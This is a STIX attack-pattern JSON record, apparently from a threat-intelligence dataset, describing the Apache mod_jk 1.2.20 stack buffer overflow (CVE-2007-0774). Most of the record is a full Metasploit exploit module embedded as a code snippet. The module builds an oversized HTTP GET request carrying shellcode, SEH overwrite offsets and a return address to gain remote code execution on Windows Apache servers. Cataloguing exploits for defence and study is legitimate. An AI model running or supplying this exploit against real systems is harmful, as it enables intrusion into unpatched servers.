{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95bd707e-5305-48a6-b068-807d0fb2d955",
    "created": "2024-08-14T16:52:42.667748Z",
    "modified": "2024-08-14T16:52:42.667751Z",
    "name": "Apache mod_jk 1.2.20 Buffer Overflow",
    "description": " This is a stack buffer overflow exploit for mod_jk 1.2.20. Should work on any Win32 OS. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/apache_modjk_overflow.rb",
            "external_id": "apache_modjk_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0774"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache mod_jk 1.2.20 Buffer Overflow',\n      'Description'    => %q{\n          This is a stack buffer overflow exploit for mod_jk 1.2.20.\n        Should work on any Win32 OS.\n      },\n      'Author'         => 'Nicob <nicob[at]nicob.net>',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-0774' ],\n          [ 'OSVDB', '33855' ],\n          [ 'BID', '22791' ],\n          [ 'ZDI', '07-008' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 4000,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\x23\\x25\\x26\\x2f\\x3b\\x3f\\x5c\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # POP/POP/RET in mod_jk 1.2.20 (Apache 1.3.37, 2.0.58 and 2.2.3)\n          ['mod_jk 1.2.20 (Apache 1.3.x/2.0.x/2.2.x) (any win32 OS/language)', { 'Ret' => 0x6a6b8ef1 }],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-03-02'))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def check\n    connect\n\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    resp = sock.get_once\n    disconnect\n\n      if (resp and (m = resp.match(/Server: Apache\\/(.*) \\(Win32\\)(.*) mod_jk\\/1\\.2\\.20/))) then\n        vprint_status(\"Apache version detected : #{m[1]}\")\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Safe\n      end\n  end\n\n  def exploit\n    connect\n\n    uri_start  = \"GET /\"\n    uri_end    = \".html HTTP/1.0\\r\\n\\r\\n\"\n    sc_base    = 16\n\n    shellcode  = payload.encoded\n    sploit     = rand_text_alphanumeric(5001)\n    sploit[sc_base, shellcode.length] = shellcode\n\n    # 4343 : Apache/1.3.37 (Win32) mod_jk/1.2.20\n    # 4407 : Apache/2.0.59 (Win32) mod_jk/1.2.20\n    # 4423 : Apache/2.2.3  (Win32) mod_jk/1.2.20\n\n    [ 4343, 4407, 4423 ].each { |seh_offset|\n      sploit[seh_offset - 9, 5] = \"\\xe9\" + [sc_base - seh_offset + 4].pack('V')\n      sploit[seh_offset - 4, 2] = \"\\xeb\\xf9\"\n      sploit[seh_offset    , 4] = [ target.ret ].pack('V')\n    }\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(uri_start + sploit + uri_end)\n\n    resp = sock.get_once\n    if (resp and (m = resp.match(/<title>(.*)<\\/title>/i)))\n      print_error(\"The exploit failed : HTTP Status Code '#{m[1]}' received :-(\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-02",
    "x_mitre_platforms": [
        "win'"
    ]
}